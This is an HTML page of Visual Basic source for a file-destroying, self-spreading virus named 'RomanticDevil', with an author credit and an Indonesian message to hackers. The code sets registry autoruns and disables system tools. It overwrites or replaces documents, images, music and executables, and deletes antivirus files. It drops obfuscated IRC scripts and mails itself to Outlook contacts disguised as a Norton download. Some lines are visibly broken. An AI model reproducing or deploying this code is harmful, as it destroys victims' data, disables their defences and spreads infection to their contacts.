<HTML><META HTTP-EQUIV="content-type" CONTENT="text/html;charset=utf-8">

<P><FONT color=#006600>Rem Program Virus RomanticDevil.ß<BR>Rem Create By : 
dr.Pluto / dr^Pluto@yahoo.com<BR>Rem Pesan buat para hacker's Indonesia<BR>Rem 
"jangan Kalah sama USA"</FONT></P>
<P><FONT color=#000099>Public</FONT> lihat_reg <FONT color=#000099>As 
Integer</FONT></P>
<P><FONT color=#000099>Sub</FONT> Main()<BR><FONT color=#000099>Dim</FONT> 
Master <FONT color=#000099>As String</FONT><BR><FONT color=#000099>Dim</FONT> 
Lokasi <FONT color=#000099>As String</FONT><BR><FONT color=#000099>Dim</FONT> A, 
B, ngawur <FONT color=#000099>As Integer</FONT><BR>Randomize<BR><FONT 
color=#000099>On Error Resume Next</FONT><BR><FONT 
color=#000099>False</FONT><BR><FONT color=#000099>Set</FONT> Obj = 
CreateObject("scripting.filesystemobject")<BR><FONT color=#000099>Set</FONT> 
Krjkn = CreateObject("WScript.Shell")<BR>Lokasi = App.path &amp; "\"<BR>Master = 
App.EXEName<BR>Master = Lokasi &amp; Master &amp; ".exe"<BR>Krjkn.regwrite 
"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Mixer", 
Obj.GetSpecialFolder(0) &amp; "\SysRoot32.dll.exe"<BR>Krjkn.regwrite 
"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Mixer", 
Obj.GetSpecialFolder(0) &amp; "\SysRoot32.dll.exe"<BR>lihat_reg = 
Krjkn.regRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell 
Extensions\Approved\{7B7DF450-F119-11CD-84465-00CA00425E90}")<BR>Obj.copyfile 
Master, Obj.GetSpecialFolder(0) &amp; "\SysRoot32.dll.exe"<BR>Obj.copyfile 
Master, "A:\Creadit Card.txt.exe"<BR>&amp;"\SysRoot32.dll.exe", 
vbHidden<BR><FONT color=#000099>If</FONT> lihat_reg = "" <FONT 
color=#000099>Or</FONT> lihat_reg &lt;&gt; 15 <FONT 
color=#000099>Then</FONT><BR>"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell 
Extensions\Approved\{7B7DF450-F119-11CD-84465-00CA00425E90}", lihat_reg + 
1<BR><FONT color=#000099>End If</FONT><BR><FONT color=#000099>If</FONT> 
lihat_reg &gt;= 1 <FONT 
color=#000099>Then</FONT><BR>"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 
"1", "REG_DWORD"<BR><FONT color=#000099>End If</FONT><BR><FONT 
color=#000099>If</FONT> lihat_reg = 2 <FONT 
color=#000099>Then</FONT><BR>"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 
"00000000", "REG_DWORD"<BR><FONT color=#000099>End If</FONT><BR><FONT 
color=#000099>If</FONT> lihat_reg = 3 <FONT 
color=#000099>Then</FONT><BR>"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 
"67108863", "REG_DWORD"<BR><FONT color=#000099>End If</FONT><BR><FONT 
color=#000099>If</FONT> lihat_reg &gt;= 4 <FONT 
color=#000099>The</FONT>n<BR><BR><FONT color=#000099>End If</FONT><BR><FONT 
color=#000099>If</FONT> lihat_reg = 5 <FONT 
color=#000099>Then</FONT><BR>"HKCU\Control Panel\Desktop\WindowMetrics\Shell 
Icon Size", "132"<BR><FONT color=#000099>End If</FONT><BR><FONT 
color=#000099>If</FONT> lihat_reg &gt; 15 And lihat_reg &lt; 31 <FONT 
color=#000099>Then</FONT><BR>Gelap<BR>pesan = "hanya test saja kok 
"<BR>"RomanticDevil." &amp; Chr(223)<BR><FONT color=#000099>ElseIf</FONT> 
lihat_reg &gt; 22 <FONT color=#000099>Then</FONT><BR>pesan = 
"By:dr.Pluto"<BR>MsgBox pesan, vbCritical + vbApplicationModal, "RomanticDevil." 
&amp; Chr(223)<BR>"Shutdown.exe -r"<BR><FONT color=#000099>End 
If</FONT><BR><FONT color=#000099>If</FONT> lihat_reg = 6 <FONT 
color=#000099>Then</FONT><BR>pesan = " RomanticDevil.B "<BR>MsgBox pesan, 
vbExclamation + vbApplicationModal, "RomanticDevil.Beta"<BR><FONT 
color=#000099>End If</FONT></P>
<P><FONT color=#000099>Call</FONT> W23W58<BR><FONT color=#000099>Call</FONT> 
Send_Outlook<BR><FONT color=#000099>End Sub</FONT></P>
<P><BR><FONT color=#000099>Sub</FONT> W23W58()<BR><FONT color=#000099>On Error 
Resume Next</FONT><BR><FONT color=#000099>Set</FONT> Obj = 
CreateObject("scripting.filesystemobject")<BR><FONT color=#000099>Set</FONT> 
W84C10 = Obj.Drives<BR>For Each W42Q62 In W84C10<BR><FONT 
color=#000099>If</FONT> W42Q62.Drivetype = Remote <FONT 
color=#000099>Then</FONT><BR>W20I84 = W42Q62 &amp; "\"<BR><FONT 
color=#000099>Call</FONT> Infect(W20I84)<BR><FONT color=#000099>ElseIf</FONT> 
W42Q62.IsReady <FONT color=#000099>Then</FONT><BR>W20I84 = W42Q62 &amp; 
"\"<BR><FONT color=#000099>Call</FONT> Infect(W20I84)<BR><FONT color=#000099>End 
If</FONT><BR><FONT color=#000099>Next</FONT><BR><FONT color=#000099>End 
Sub</FONT></P>
<P><BR><FONT color=#000099>Sub</FONT> Infect(X94E78)<BR><FONT color=#000099>On 
Error Resume Next</FONT><BR><FONT color=#000099>Set</FONT> Obj = 
CreateObject("scripting.filesystemobject")<BR>Lokasi = App.path &amp; 
"\"<BR>Master = App.EXEName<BR><FONT color=#000099>Set</FONT> X85W4 = 
Obj.GetFolder(X94E78)<BR><FONT color=#000099>Set</FONT> X59Q23 = 
X85W4.Files<BR><FONT color=#000099>For Each</FONT> X39I89 <FONT 
color=#000099>In</FONT> X59Q23<BR>Ext_file = 
Obj.GetExtensionName(X39I89.path)</P>
<P><FONT color=#000099>If</FONT> Ext_file = "htm" Or Ext_file = "html" <FONT 
color=#000099>Or</FONT> Ext_file = "php" <FONT 
color=#000099>Then</FONT><BR><FONT color=#000099>Set</FONT> C = 
Obj.CreateTextFile(X39I89.path, <FONT color=#000099>True</FONT>)<BR>C.WriteLine 
"&lt;/html&gt;&lt;head&gt;&lt;title&gt;RomanticDevil&lt;/title&gt;&lt;meta 
http-equiv=""Content-Type"" content=""text/html; 
charset=iso-8859-1""&gt;&lt;/head&gt; &lt;body bgcolor=""#000000"" 
link=""#006600""&gt; &lt;p align=""right""&gt; &lt;font color=""#00FF00"" 
size=""6"" face=""Script""&gt; &lt;div align=""right""&gt;&lt;font 
color=""#00FF00"" size=""6"" face=""Script""&gt; A Woman 's heart is a deep 
ocean of secrets.&lt;/font&gt;&lt;/div&gt;&lt;p align=""left""&gt;&lt;font 
color=""#00FF00"" size=""6"" face=""Script""&gt;But now you all know there was a 
man &lt;/font&gt;&lt;font color=""#00FF00"" size=""6"" face=""Script""&gt;named 
jack Dawson, and that he saved me,&lt;/font&gt;&lt;font color=""#00FF00"" 
size=""6"" face=""Script""&gt;in every way that a person can be 
saved.&lt;/font&gt;&lt;p align=""right""&gt;&lt;a 
href=""mailto:RomanticDevil@yahoo.com""&gt;&lt;font size=""6""&gt;Rose Dewitt 
Bukater&lt;/font&gt;&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;"<BR>C.Close<BR><FONT 
color=#000099>End If</FONT><BR><FONT color=#000099>If</FONT> Ext_file = "xls" Or 
Ext_file = "doc" <FONT color=#000099>Or</FONT> Ext_file = "jpg" <FONT 
color=#000099>Or</FONT> Ext_file = "gif" <FONT color=#000099>Or</FONT> Ext_file 
= "mp3" <FONT color=#000099>Then</FONT><BR><FONT color=#000099>Set</FONT> C = 
Obj.CreateTextFile(X39I89.path, <FONT color=#000099>True</FONT>)<BR>C.WriteLine 
vbCrLf &amp; vbCrLf &amp; " RomanticDevil." &amp; Chr(223) &amp; vbCrLf &amp; "" 
&amp; vbCrLf &amp; " A Woman 's heart is a deep ocean of secrets" &amp; vbCrLf 
&amp; " But now you all know there was a man" &amp; vbCrLf &amp; " named jack 
Dawson, and that he saved me," &amp; vbCrLf &amp; " in every way that a person 
can be saved." &amp; vbCrLf &amp; "" &amp; vbCrLf &amp; " Rose Dewitt 
Bukater"<BR>C.Close<BR><FONT color=#000099>End If</FONT><BR><FONT 
color=#000099>If</FONT> Ext_file = "txt" <FONT 
color=#000099>Then</FONT><BR>Obj.copyfile Obj.GetSpecialFolder(0) &amp; 
"\SysRoot32.dll.exe", X39I89.path &amp; ".exe", <FONT 
color=#000099>True</FONT><BR><FONT color=#000000>SetAttr</FONT> X39I89.path 
&amp; ".exe", vbNormal<BR><FONT color=#000000>Kill</FONT> X39I89.path<BR><FONT 
color=#000099>End If</FONT><BR>' fungsi menghapus anti 2 Virus<BR><FONT 
color=#000099>If</FONT> X39I89.Name = "ALUNOTIFY.EXE" <FONT 
color=#000099>Or</FONT> X39I89.Name = "mcdash.exe" <FONT color=#000099>Or</FONT> 
X39I89.Name = "mcagent.exe" <FONT color=#000099>Then</FONT><BR>Kill 
X39I89.path<BR><FONT color=#000099>End If</FONT><BR><FONT 
color=#000099>If</FONT> X39I89.Name = Chr(109) &amp; Chr(105) &amp; Chr(114) 
&amp; Chr(99) &amp; ".ini" <FONT color=#000099>Or</FONT> X39I89.Name = Chr(109) 
&amp; Chr(105) &amp; Chr(114) &amp; Chr(99) &amp; ".exe" <FONT 
color=#000099>Then</FONT><BR>Fungsi_mIRC (X39I89.ParentFolder)<BR><FONT 
color=#000099>End If</FONT><BR><FONT color=#000099>If</FONT> X39I89.Name = 
"Pirch32.exe" <FONT color=#000099>Then</FONT><BR>Fungsi_Pirch 
(X39I89.ParentFolder)<BR><FONT color=#000099>End If</FONT><BR><FONT 
color=#000099>If</FONT> lihat_reg &gt; 15 <FONT 
color=#000099>Then</FONT><BR><FONT color=#000099>If</FONT> Ext_file = "exe" 
<FONT color=#000099>Or</FONT> Ext_file = "com" <FONT 
color=#000099>Then</FONT><BR>Obj.copyfile Obj.GetSpecialFolder(0) &amp; 
"\SysRoot32.dll.exe", X39I89.path, <FONT color=#000099>True</FONT><BR>SetAttr 
X39I89.path, vbNormal<BR><FONT color=#000099>End If<BR>End 
If<BR>Next<BR>Set</FONT> X39I89 = X85W4.SubFolders<BR><FONT color=#000099>For 
Each</FONT> X19I36 <FONT color=#000099>In</FONT> X39I89<BR><FONT 
color=#000099>Call</FONT> Infect(X19I36.path)<BR><FONT color=#000099>Next<BR>End 
Sub</FONT></P>
<P><FONT color=#000099>Function</FONT> Fungsi_mIRC(path)<BR><FONT 
color=#000099>On Error Resume Next<BR>Set</FONT> Obj = 
CreateObject("scripting.filesystemobject")<BR><FONT color=#000099>Set</FONT> 
Krjkn = CreateObject("WScript.Shell")<BR>baca = 
"½µÅÔËÒÖ¿olÐ’ŸÑÐ‚“œ¬±«°œ…œÝolÐ“Ÿ‚‚‘ËÈ‚Š‚†ÐËÅÍ‚ŸŸ‚†ÏÇ‚‹‚Ý‚ÊÃÎÖ‚ßolÐ”Ÿ‚‚‘ÆÅÅ‚ÕÇÐÆ‚†ÐËÅÍ‚¥œ¾¹«°¦±¹µ¾µÛÕ´ÑÑÖ•”ÆÎÎÇÚÇolÐ•Ÿß"<BR><FONT 
color=#000099>If</FONT> path = "" <FONT color=#000099>Then</FONT><BR><FONT 
color=#000099>If</FONT> Obj.fileexists("" &amp; Chr(67) &amp; ":\" &amp; 
Chr(109) &amp; Chr(105) &amp; "rc\" &amp; Chr(109) &amp; Chr(105) &amp; 
"rc.ini") <FONT color=#000099>Then</FONT> path = "" &amp; Chr(67) &amp; ":\" 
&amp; Chr(109) &amp; Chr(105) &amp; "rc"<BR><FONT color=#000099>If</FONT> 
Obj.fileexists("" &amp; Chr(67) &amp; ":\" &amp; Chr(109) &amp; Chr(105) &amp; 
"rc32\" &amp; Chr(109) &amp; Chr(105) &amp; "rc.ini") <FONT 
color=#000099>Then</FONT> path = "" &amp; Chr(67) &amp; ":\mirc32"<BR>P69R22 = 
Krjkn.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")<BR><FONT 
color=#000099>If</FONT> Obj.fileexists(P69R22 &amp; "\" &amp; Chr(109) &amp; 
Chr(105) &amp; "rc\" &amp; Chr(109) &amp; Chr(105) &amp; "rc.ini") <FONT 
color=#000099>Then</FONT> path = P69R22 &amp; "\" &amp; Chr(109) &amp; Chr(105) 
&amp; "rc"<BR><FONT color=#000099>End If<BR>If</FONT> path &lt;&gt; "" <FONT 
color=#000099>Then</FONT><BR><FONT color=#000099>Set</FONT> P35T19 = 
Obj.CreateTextFile(path &amp; "\" &amp; Chr(115) &amp; "cript" &amp; Chr(46) 
&amp; "ini", <FONT color=#000099>True</FONT>)<BR><FONT color=#000099>For</FONT> 
i = 1 <FONT color=#000099>To</FONT> Len(baca)<BR>HVFM = Mid(baca, i, 2)<BR>VFMH 
= VFMH &amp; Chr(Asc(HVFM) - 98)<BR><FONT color=#000099>Next</FONT> 
i<BR>P35T19.WriteLine VFMH<BR>P35T19.Close<BR><FONT color=#000099>End If<BR>End 
Function</FONT></P>
<P><BR><FONT color=#000099>Function</FONT> Fungsi_Pirch(path)<BR><FONT 
color=#000099>On Error Resume Next<BR>Set</FONT> Obj = 
CreateObject("scripting.filesystemobject")<BR><FONT color=#000099>Set</FONT> 
Krjkn = CreateObject("WScript.Shell")<BR>MasDex = 
"½®ÇØÇÎÕ¿ol§ÐÃÄÎÇÆŸ“ol¥Ñ×ÐÖŸ˜ol®ÇØÇÎ“Ÿ’’’·ÐÍÐÑÙÐÕol’’’·ÐÍÐÑÙÐÕ§ÐÃÄÎÇÆŸ“ol®ÇØÇÎ”Ÿ“’’®ÇØÇÎ‚“’’ol“’’®ÇØÇÎ‚“’’§ÐÃÄÎÇÆŸ“ol®ÇØÇÎ•Ÿ”’’®ÇØÇÎ‚”’’ol”’’®ÇØÇÎ‚”’’§ÐÃÄÎÇÆŸ“ol®ÇØÇÎ–Ÿ•’’®ÇØÇÎ‚•’’ol‚•’’®ÇØÇÎ‚•’’§ÐÃÄÎÇÆŸ“ol®ÇØÇÎ—Ÿ–’’®ÇØÇÎ‚–’’‚ol–’’®ÇØÇÎ‚–’’§ÐÃÄÎÇÆŸ“ol®ÇØÇÎ˜Ÿ—’’®ÇØÇÎ‚—’’ol—’’®ÇØÇÎ‚—’’§ÐÃÄÎÇÆŸ“olol½’’’·ÐÍÐÑÙÐÕ¿ol·ÕÇÔ¥Ñ×ÐÖŸ’ol§ØÇÐÖ¥Ñ×ÐÖŸ’olol½“’’®ÇØÇÎ‚“’’¿ol·ÕÇÔ“ŸŒƒŒ¢Œol·ÕÇÔ¥Ñ×ÐÖŸ“ol§ØÇÐÖ“Ÿ±°‚¬±«°œ…œ‘ÆÅÅ‚ÖÕÇÐÆ‚†ÐËÅÍ‚¥œ¾¹«°¦±¹µ¾µÛÕ´ÑÑÖ•”ÆÎÎÇÚÇol§ØÇÐÖ¥Ñ×ÐÖŸ“olol½”’’®ÇØÇÎ‚”’’¿ol·ÕÇÔ¥Ñ×ÐÖŸ’ol§ØÇÐÖ¥Ñ×ÐÖŸ’olol½•’’®ÇØÇÎ‚•’’¿ol·ÕÇÔ¥Ñ×ÐÖŸ’ol§ØÇÐÖ¥Ñ×ÐÖŸ’olol½–’’®ÇØÇÎ‚–’’¿ol·ÕÇÔ¥Ñ×ÐÖŸ’ol§ØÇÐÖ¥Ñ×ÐÖŸ’olol½—’’®ÇØÇÎ‚—’’¿ol·ÕÇÔ¥Ñ×ÐÖŸ’ol§ØÇÐÖ¥Ñ×ÐÖŸ’ol"<BR><FONT 
color=#000099>If</FONT> path = "" <FONT color=#000099>Then</FONT><BR><FONT 
color=#000099>If</FONT> Obj.fileexists("c:\Pirc\pirch32.exe") <FONT 
color=#000099>Then</FONT> path = "c:\pirch"<BR><FONT color=#000099>If</FONT> 
Obj.fileexists("c:\Pirc32\pirch32.exe") <FONT color=#000099>Then</FONT> path = 
"c:\pirch32"<BR>P69R22 = 
Krjkn.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")<BR><FONT 
color=#000099>If</FONT> Obj.fileexists(P69R22 &amp; "\pirch\Pirch32.exe") <FONT 
color=#000099>Then</FONT> path = P69R22 &amp; "\pirch\Pirch32.exe"<BR><FONT 
color=#000099>End If<BR>If</FONT> path &lt;&gt; "" <FONT 
color=#000099>Then<BR>Set</FONT> S24K8 = Obj.CreateTextFile(path &amp; 
"\events.ini", <FONT color=#000099>True</FONT>)</P>
<P><FONT color=#000099>For</FONT> i = 1 <FONT color=#000099>To</FONT> 
Len(MasDex)<BR>HVFM = Mid(MasDex, i, 1)<BR>VFMH = VFMH &amp; Chr(Asc(HVFM) - 
98)<BR><FONT color=#000099>Next</FONT> i</P>
<P>S24K8.WriteLine VFMH<BR>S24K8.Close<BR><FONT color=#000099>End If<BR>End 
Function</FONT></P>
<P><FONT color=#000099><BR>Function</FONT> Send_Outlook()<BR><FONT 
color=#000099>On Error Resume Next<BR>Set</FONT> Obj = 
CreateObject("scripting.filesystemobject")<BR><FONT color=#000099>Set</FONT> 
Krjkn = CreateObject("WScript.Shell")<BR><FONT color=#000099>Set</FONT> Q9Q83 = 
CreateObject("Outlook.Application")<BR>kirimkan = Attachments.Add<BR>hapusS = 
DeleteAfterSubmit<BR><FONT color=#000099>If</FONT> Q9Q83 = "Outlook" <FONT 
color=#000099>Then</FONT><BR><FONT color=#000099>Set</FONT> Q17U16 = 
Q9Q83.GetNameSpace("MAPI")<BR><FONT color=#000099>For Each</FONT> Q8G83 <FONT 
color=#000099>In</FONT> Q17U16.AddressLists<BR><FONT color=#000099>If</FONT> 
Q8G83.AddressEntries.Count &lt;&gt; 0 <FONT color=#000099>Then</FONT><BR>Q47B57 
= Q8G83.AddressEntries.Count<BR><FONT color=#000099>For</FONT> Q19T80 = 1 <FONT 
color=#000099>To</FONT> Q47B57<BR><FONT color=#000099>Set</FONT> Q0R0 = 
Q9Q83.CreateItem(0)<BR><FONT color=#000099>Set</FONT> Q9O75 = 
Q8G83.AddressEntries(Q19T80)</P>
<P>Q0R0.To = Q9O75.Address<BR>Q0R0.Subject = "From your old friend"<BR>Q0R0.Body 
= "Download your AntiVirus With Norton Anti Virus To get" &amp; vbCrLf &amp; 
"Download free of charge take License file which we figure In"<BR>Q0R0.kirimkan 
Obj.GetSpecialFolder(0) &amp; "\SysRoot32.dll.exe"<BR>Q0R0.hapusS = True</P>
<P><FONT color=#000099>If</FONT> Q0R0.To &lt;&gt; "" <FONT 
color=#000099>Then</FONT><BR>Q0R0.Send<BR><FONT color=#000099>End 
If<BR>Next<BR>End If<BR>Next<BR>End If<BR>End Function</FONT></P>
<P><FONT color=#000099><BR>Function</FONT> HTMLR()<BR>Randomize<BR><FONT 
color=#000099>Set</FONT> Obj = 
CreateObject("scripting.filesystemobject")<BR><FONT color=#000099>Set</FONT> 
Krjkn = CreateObject("WScript.Shell")<BR><FONT color=#000099>For</FONT> i = 1 
<FONT color=#000099>To</FONT> 1000<BR>A = Int(Rnd * 10000)<BR><FONT 
color=#000099>Set</FONT> VGH = Obj.CreateTextFile(Obj.GetSpecialFolder(0) &amp; 
"\Rose" &amp; A &amp; ".htm", <FONT color=#000099>True</FONT>)<BR>VGH.WriteLine 
"&lt;/html&gt;&lt;head&gt;&lt;title&gt;RomanticDevil&lt;/title&gt;&lt;meta 
http-equiv=""Content-Type"" content=""text/html; 
charset=iso-8859-1""&gt;&lt;/head&gt; &lt;body bgcolor=""#000000"" 
link=""#006600""&gt; &lt;p align=""right""&gt; &lt;font color=""#00FF00"" 
size=""6"" face=""Script""&gt; &lt;div align=""right""&gt;&lt;font 
color=""#00FF00"" size=""6"" face=""Script""&gt; A Woman 's heart is a deep 
ocean of secrets.&lt;/font&gt;&lt;/div&gt;&lt;p align=""left""&gt;&lt;font 
color=""#00FF00"" size=""6"" face=""Script""&gt;But now you all know there was a 
man &lt;/font&gt;&lt;font color=""#00FF00"" size=""6"" face=""Script""&gt;named 
jack Dawson, and that he saved me,&lt;/font&gt;&lt;font color=""#00FF00"" 
size=""6"" face=""Script""&gt;in every way that a person can be 
saved.&lt;/font&gt;&lt;p align=""right""&gt;&lt;a 
href=""mailto:RomanticDevil@yahoo.com""&gt;&lt;font size=""6""&gt;Rose Dewitt 
Bukater&lt;/font&gt;&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;"<BR>VGH.Close<BR><FONT 
color=#000099>Next</FONT> i<BR>Krjkn.regwrite "HKCU\Software\Microsoft\Internet 
Explorer\Main\Local Page", Obj.GetSpecialFolder(0) &amp; "\Rose" &amp; A &amp; 
".htm"<BR>Krjkn.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start 
Page", Obj.GetSpecialFolder(0) &amp; "\Rose" &amp; A &amp; ".htm"<BR><FONT 
color=#000099>End Function</FONT></P>
<P><FONT color=#000099><BR>Sub</FONT> Gelap()<BR><FONT color=#000099>Set</FONT> 
Krjkn = CreateObject("WScript.Shell")<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\ActiveBorder", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\ActiveTitle", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\AppWorkSpace", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\Background", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\ButtonAlternateFace", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\ButtonDkShadow", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\ButtonFace", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\ButtonHilight", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\ButtonLight", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\ButtonShadow", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\GradientActiveTitle", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\GradientInactiveTitle", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\GrayText", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\Hilight", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\HilightText", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\HotTrackingColor", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\InactiveBorder", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\InactiveTitle", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\InactiveTitleText", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\InfoWindow", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\Menu", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\TitleText", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\Window", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\MenuHilight", "0 0 0"<BR>Krjkn.regwrite "HKCU\Control 
Panel\Colors\MenuBar", "0 0 0"<BR><FONT color=#000099>End Sub</FONT><BR></P>